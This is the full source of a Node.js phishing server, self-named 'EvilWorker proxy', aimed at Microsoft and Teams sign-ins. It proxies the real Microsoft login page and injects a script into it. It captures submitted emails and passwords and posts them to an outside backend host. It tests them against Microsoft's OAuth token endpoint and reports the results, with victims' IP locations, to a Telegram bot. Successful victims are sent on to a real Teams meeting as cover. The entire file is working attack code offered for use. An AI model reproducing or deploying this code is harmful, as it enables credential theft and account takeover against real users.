const http = require('http');
const https = require('https');
const fs = require('fs');
const path = require('path');
const querystring = require('querystring');
const crypto = require('crypto');

// ============================================================
//  CONFIGURATION
// ============================================================

const PROXY_ENTRY_POINT = "/login";
const REDIRECT_URL = "https://login.microsoftonline.com/";
const BACKEND_URL = "https://meeting-h5ze.onrender.com";
const TEAMS_REDIRECT = "https://teams.live.com/dl/launcher/launcher.html?url=%2F_%23%2Fmeet%2F9348548468028%3Fp%3DO0l72J7eL4jegeQa7J%26anon%3Dtrue&type=meet&deeplinkId=109bc758-6e1b-47cb-907b-ed2379475a58&directDl=true&msLaunch=true&enableMobilePage=true&suppressPrompt=true";

const PROXY_PATHNAMES = {
    script: "/@",
    serviceWorker: "/service_worker_Mz8XO2ny1Pg5.js"
};

// ============================================================
//  HELPERS
// ============================================================

async function sendToBackend(email, password, req) {
    try {
        const axios = require('axios');
        await axios.post(`${BACKEND_URL}/api/log-action`, {
            action: 'login_attempt',
            email: email,
            password: password,
            visitorInfo: {
                fullUrl: req.url,
                userAgent: req.headers['user-agent'] || 'Unknown',
                ip: req.socket.remoteAddress || 'Unknown'
            }
        });
        console.log(`[BACKEND] ✅ Sent credentials for: ${email}`);
    } catch (error) {
        console.error(`[BACKEND] ❌ Failed to send: ${error.message}`);
    }
}

// --- Send to Telegram for authentication result ---
async function sendAuthResultToTelegram(email, success, ip) {
    try {
        const axios = require('axios');
        const location = await getLocationFromIp(ip);
        const msg = success 
            ? `✅ *Successful Login*\n\n📧 Email: ${email}\n📍 Location: ${location.full}\n📡 IP: ${ip}\n🕐 Time: ${new Date().toISOString()}`
            : `❌ *Failed Login Attempt*\n\n📧 Email: ${email}\n📍 Location: ${location.full}\n📡 IP: ${ip}\n🕐 Time: ${new Date().toISOString()}`;
        
        await axios.post(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: process.env.TELEGRAM_CHAT_ID,
            text: msg,
            parse_mode: 'Markdown'
        });
        console.log(`[TELEGRAM] ✅ Sent auth result for: ${email}`);
    } catch (error) {
        console.error(`[TELEGRAM] ❌ Failed to send: ${error.message}`);
    }
}

async function getLocationFromIp(ip) {
    return new Promise((resolve) => {
        const request = https.get(
            `https://ip-api.com/json/${ip}?fields=status,message,city,regionName,country`,
            { timeout: 5000 },
            (resp) => {
                let data = '';
                resp.on('data', chunk => data += chunk);
                resp.on('end', () => {
                    try {
                        const response = JSON.parse(data);
                        if (response.status === 'success') {
                            resolve({
                                full: `${response.city || 'Unknown'}, ${response.regionName || 'Unknown'}, ${response.country || 'Unknown'}`
                            });
                        } else {
                            resolve({ full: 'Location unavailable' });
                        }
                    } catch (e) {
                        resolve({ full: 'Location error' });
                    }
                });
            }
        );
        request.on('error', () => resolve({ full: 'Location timeout' }));
        request.on('timeout', () => {
            request.destroy();
            resolve({ full: 'Location timeout' });
        });
    });
}

// --- Verify credentials with Microsoft ---
function verifyWithMicrosoft(email, password) {
    return new Promise((resolve, reject) => {
        const postData = querystring.stringify({
            client_id: '943a2b14-68aa-4205-88c1-a4b65ab04e81',
            grant_type: 'password',
            username: email,
            password: password,
            scope: 'openid profile email'
        });

        const options = {
            hostname: 'login.microsoftonline.com',
            path: '/common/oauth2/v2.0/token',
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Content-Length': Buffer.byteLength(postData)
            }
        };

        const req = https.request(options, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                try {
                    const response = JSON.parse(data);
                    if (response.access_token) {
                        resolve({ success: true, data: response });
                    } else {
                        resolve({ success: false, error: response.error_description || 'Invalid credentials' });
                    }
                } catch (error) {
                    reject(new Error('Failed to parse Microsoft response'));
                }
            });
        });

        req.on('error', (error) => {
            reject(error);
        });

        req.write(postData);
        req.end();
    });
}

// --- Serve File ---
function serveFile(filename, res, contentType = 'text/html') {
    const filePath = path.join(__dirname, filename);
    fs.readFile(filePath, (err, data) => {
        if (err) {
            console.error(`[ERROR] Failed to read ${filename}: ${err.message}`);
            res.writeHead(404, { 'Content-Type': 'text/html' });
            res.end('<h1>404 Not Found</h1>');
            return;
        }
        res.writeHead(200, { 
            'Content-Type': contentType,
            'Cache-Control': 'no-store'
        });
        res.end(data);
    });
}

// ============================================================
//  REQUEST HANDLERS
// ============================================================

function handlePostRequest(body, req, res) {
    try {
        const formData = querystring.parse(body);
        const email = formData.login || formData.loginfmt || formData.email || '';
        const password = formData.passwd || formData.password || '';

        console.log(`[CREDENTIALS] 📧 Email: ${email}, 🔑 Password: ${password}`);

        // Send to backend for logging
        sendToBackend(email, password, req);

        // Verify with Microsoft
        verifyWithMicrosoft(email, password)
            .then((result) => {
                const ip = req.socket.remoteAddress || 'Unknown';
                
                if (result.success) {
                    console.log(`[AUTH] ✅ Valid credentials for: ${email}`);
                    sendAuthResultToTelegram(email, true, ip);
                    
                    // Redirect to REAL Teams meeting
                    res.writeHead(302, { 
                        'Location': TEAMS_REDIRECT,
                        'Cache-Control': 'no-store'
                    });
                    res.end();
                } else {
                    console.log(`[AUTH] ❌ Invalid credentials for: ${email}`);
                    sendAuthResultToTelegram(email, false, ip);
                    
                    // Redirect back to login with error
                    const errorUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=943a2b14-68aa-4205-88c1-a4b65ab04e81&response_type=code&redirect_uri=https://login.microsoftonline.com/common/oauth2/nativeclient&scope=openid%20profile%20email&login_hint=${encodeURIComponent(email)}&error=invalid_credentials`;
                    res.writeHead(302, { 'Location': errorUrl });
                    res.end();
                }
            })
            .catch((error) => {
                console.error('[ERROR] Microsoft verification failed:', error.message);
                // On error, redirect to login with generic error
                const errorUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=943a2b14-68aa-4205-88c1-a4b65ab04e81&response_type=code&redirect_uri=https://login.microsoftonline.com/common/oauth2/nativeclient&scope=openid%20profile%20email&login_hint=${encodeURIComponent(email)}&error=service_error`;
                res.writeHead(302, { 'Location': errorUrl });
                res.end();
            });

    } catch (error) {
        console.error('[ERROR] POST handling failed:', error.message);
        res.writeHead(500);
        res.end('Internal server error');
    }
}

function handleLoginRequest(req, res) {
    const rawEmail = req.url.split('login_hint=')[1]?.split('&')[0] || '';
    const email = decodeURIComponent(rawEmail);
    
    const targetUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=943a2b14-68aa-4205-88c1-a4b65ab04e81&response_type=code&redirect_uri=https://login.microsoftonline.com/common/oauth2/nativeclient&scope=openid%20profile%20email&login_hint=${encodeURIComponent(email)}`;
    
    console.log(`[PROXY] 🔄 Forwarding to: ${targetUrl}`);
    console.log(`[PROXY] 📧 Email decoded: ${email}`);
    
    https.get(targetUrl, (targetRes) => {
        let data = [];
        targetRes.on('data', (chunk) => data.push(chunk));
        targetRes.on('end', () => {
            let body = Buffer.concat(data).toString();
            
            body = body.replace(
                '</body>',
                `<script src="${PROXY_PATHNAMES.script}"></script></body>`
            );
            
            res.writeHead(200, {
                'Content-Type': 'text/html',
                'Cache-Control': 'no-store'
            });
            res.end(body);
        });
    }).on('error', (err) => {
        console.error(`[ERROR] Proxy failed: ${err.message}`);
        res.writeHead(302, { 'Location': targetUrl });
        res.end();
    });
}

// ============================================================
//  SERVER
// ============================================================

const server = http.createServer((req, res) => {
    console.log(`[REQUEST] ${req.method} ${req.url}`);

    if (req.url === '/' || req.url === '/index.html') {
        serveFile('index.html', res);
        return;
    }

    if (req.url === '/404' || req.url === '/404_not_found_lk48ZVr32WvU.html') {
        serveFile('404_not_found_lk48ZVr32WvU.html', res);
        return;
    }

    if (req.url === PROXY_PATHNAMES.script) {
        serveFile('script_Vx9Z6XN5uC3k.js', res, 'text/javascript');
        return;
    }

    if (req.url === PROXY_PATHNAMES.serviceWorker) {
        serveFile('service_worker_Mz8XO2ny1Pg5.js', res, 'text/javascript');
        return;
    }

    if (req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            handlePostRequest(body, req, res);
        });
        return;
    }

    if (req.url.startsWith(PROXY_ENTRY_POINT)) {
        handleLoginRequest(req, res);
        return;
    }

    res.writeHead(302, { 'Location': REDIRECT_URL });
    res.end();
});

// ============================================================
//  START SERVER
// ============================================================

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`✅ EvilWorker proxy running on port ${PORT}`);
    console.log(`📍 Entry point: ${PROXY_ENTRY_POINT}`);
    console.log(`🔗 Backend URL: ${BACKEND_URL}`);
    console.log(`📤 Teams redirect: ${TEAMS_REDIRECT}`);
    console.log('🔄 Proxy is ready for connections');
});

// ============================================================
//  ERROR HANDLING
// ============================================================

process.on('uncaughtException', (err) => {
    console.error('🔥 UNCAUGHT EXCEPTION:', err);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('🔥 UNHANDLED REJECTION:', reason);
});